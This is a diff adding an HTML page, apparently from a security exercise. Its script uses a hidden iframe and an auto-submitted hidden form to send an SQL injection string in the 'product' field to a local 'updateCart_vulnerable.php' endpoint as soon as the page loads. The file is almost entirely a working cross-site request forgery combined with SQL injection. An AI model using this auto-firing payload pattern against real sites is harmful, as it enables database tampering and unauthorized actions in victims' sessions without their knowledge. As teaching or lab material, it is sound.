@@ -1,0 +1,44 @@
+<html>
+    <head>
+
+    </head>
+    <body>
+        <script>
+        let dangerousSQL = '" OR 1=1);-- ';
+
+        // What's prefixing e.g. index.php in the URL.
+        let baseURL = "http://localhost:8080/";
+
+        let iframe = document.createElement("iframe");
+        iframe.name = "myTarget";
+        iframe.style.display = "none";
+
+        function postRequest(url, data={}) {
+            let form = document.createElement("form");
+            let node = document.createElement("input");
+
+            form.action = url;
+            form.target = iframe.name;
+            form.method = "post";
+
+            for(name in data) {
+                node.name  = name;
+                node.value = data[name].toString();
+                form.appendChild(node.cloneNode());
+            }
+
+            form.style.display = "none";
+            document.body.appendChild(form);
+
+            form.submit();
+            
+            document.body.removeChild(form);
+        }
+
+        window.addEventListener("load", function () {
+            document.body.appendChild(iframe);
+            postRequest(baseURL + "updateCart_vulnerable.php", {'action': "set", 'product': dangerousSQL, 'quantity': "2"});
+        });
+        </script>
+    </body>
+</html>
